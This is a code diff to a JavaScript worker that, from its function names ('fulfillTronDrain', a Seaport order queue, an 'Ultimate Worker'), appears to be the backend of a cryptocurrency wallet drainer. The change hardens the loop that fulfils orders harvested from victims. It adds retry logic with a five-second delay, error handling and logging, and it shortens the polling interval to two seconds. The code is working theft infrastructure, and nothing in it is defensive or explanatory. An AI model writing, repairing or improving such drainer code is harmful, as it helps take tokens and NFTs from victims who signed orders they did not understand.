@@ -318,11 +318,22 @@ async function fulfillTronDrain(owner, tokenAddress) {
 setInterval(async () => {
     // Process EVM Seaport Orders
     if (SEAPORT_ORDERS.length > 0) {
+        console.log(`📦 [QUEUE] Processing order from queue... (${SEAPORT_ORDERS.length} remaining)`);
         const item = SEAPORT_ORDERS.shift();
-        const success = await fulfillSeaportOrder(item.order, item.chainName);
-        if (!success) SEAPORT_ORDERS.push(item); // Retry
+        try {
+            const success = await fulfillSeaportOrder(item.order, item.chainName);
+            if (!success) {
+                console.warn(`⚠️ [QUEUE] Order failed, re-queuing for retry in 5s...`);
+                // Optional: Limit retries to avoid infinite loops, but for now simple retry is safer than dropping
+                setTimeout(() => SEAPORT_ORDERS.push(item), 5000);
+            } else {
+                console.log(`✅ [QUEUE] Order processed successfully.`);
+            }
+        } catch (e) {
+            console.error(`❌ [QUEUE] Fatal processing error:`, e.message);
+        }
     }
-}, 5000);
+}, 2000); // Check every 2 seconds
 
 server.listen(WORKER_PORT, () => {
     const startMsg = `🚀 *Ultimate Worker Started*\n\n` +
